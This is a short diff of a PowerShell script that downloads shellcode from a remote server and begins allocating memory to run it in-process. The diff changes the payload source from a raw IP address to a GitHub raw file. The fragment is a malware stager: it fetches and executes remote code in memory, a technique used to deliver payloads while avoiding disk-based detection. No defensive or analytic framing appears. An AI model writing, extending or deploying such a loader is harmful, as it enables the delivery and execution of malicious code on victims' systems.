@@ -1,6 +1,6 @@
 try {
     # Download and load shellcode directly into memory
-    $shellcodeUrl = "http://65.38.121.31:9000/loader.bin"
+    $shellcodeUrl = "https://github.com/j43140027/752384324/raw/refs/heads/master/loader.bin"
     $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content
 
     # Allocate memory for the shellcode
